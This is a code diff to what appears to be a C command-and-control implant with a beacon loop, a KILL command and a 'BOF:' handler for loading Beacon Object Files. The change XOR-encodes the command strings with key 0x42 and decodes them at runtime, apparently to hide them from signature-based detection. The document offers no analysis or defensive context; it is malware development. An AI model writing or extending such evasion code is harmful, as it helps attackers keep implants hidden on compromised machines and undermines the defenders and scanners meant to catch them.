@@ -11,6 +11,16 @@
 #define PATH_BUF_SIZE  512
 #define AGENT_ID_SIZE  256
 
+static char g_cmd_kill[5];
+static char g_cmd_bof[5];
+
+static void init_command_strings(void) {
+    static const unsigned char k[] = {'K'^0x42,'I'^0x42,'L'^0x42,'L'^0x42,0};
+    static const unsigned char b[] = {'B'^0x42,'O'^0x42,'F'^0x42,':'^0x42,0};
+    for (int i = 0; k[i] || i == 0; i++) g_cmd_kill[i] = k[i] ^ 0x42;
+    for (int i = 0; b[i] || i == 0; i++) g_cmd_bof[i] = b[i] ^ 0x42;
+}
+
 /* ---------------------------------------------------------------------------
  * process_command
  *
@@ -32,10 +42,10 @@ static int process_command(char *cmd_plain, int cmd_len,
 
     if (cmd[0] == '\0') return 0;
 
-    if (strcmp(cmd, "KILL") == 0) {
+    if (strcmp(cmd, g_cmd_kill) == 0) {
         return 1;
 
-    } else if (strncmp(cmd, "BOF:", 4) == 0) {
+    } else if (strncmp(cmd, g_cmd_bof, 4) == 0) {
         char *bof_name = cmd + 4;
         char *args_hex = strchr(bof_name, ':');
         if (!args_hex) {
@@ -121,6 +131,8 @@ int main(void) {
         free(resp);   /* free(NULL) is safe */
         shell_buf_reset();
     }
+
+    init_command_strings();
 
     /* Main beacon loop */
     while (1) {
